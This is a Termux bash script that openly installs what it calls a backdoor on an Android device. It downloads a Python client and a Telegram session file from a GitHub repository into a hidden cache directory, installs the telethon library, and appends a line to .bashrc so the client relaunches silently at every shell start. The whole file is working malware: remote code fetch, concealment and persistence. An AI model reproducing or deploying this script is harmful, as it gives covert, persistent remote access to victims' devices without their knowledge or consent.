#!/data/data/com.termux/files/usr/bin/bash
set -e

REPO_URL="https://github.com/precise104/precise2/raw/main"
CLIENT_SCRIPT="client.py"
SESSION_FILE="client.session"
HIDDEN_DIR="$HOME/.config/.cache"
BASH_RC="$HOME/.bashrc"
PYTHON_PKG="python"
PIP_PKG="python-pip"
TELEGRAM_LIB="telethon"

mkdir -p "$HIDDEN_DIR"

curl -sL "$REPO_URL/$CLIENT_SCRIPT" -o "$HIDDEN_DIR/$CLIENT_SCRIPT"
curl -sL "$REPO_URL/$SESSION_FILE" -o "$HIDDEN_DIR/$SESSION_FILE"

pkg install -y "$PYTHON_PKG" "$PIP_PKG"
pip install --upgrade "$TELEGRAM_LIB"

chmod +x "$HIDDEN_DIR/$CLIENT_SCRIPT"

PERSIST_LINE="pgrep -f \"python.*$CLIENT_SCRIPT\" > /dev/null || (python $HIDDEN_DIR/$CLIENT_SCRIPT >/dev/null 2>&1 &)"
if ! grep -qF "$PERSIST_LINE" "$BASH_RC"; then
    echo "$PERSIST_LINE" >> "$BASH_RC"
fi

echo "Setup complete. Backdoor will start on next Termux launch."
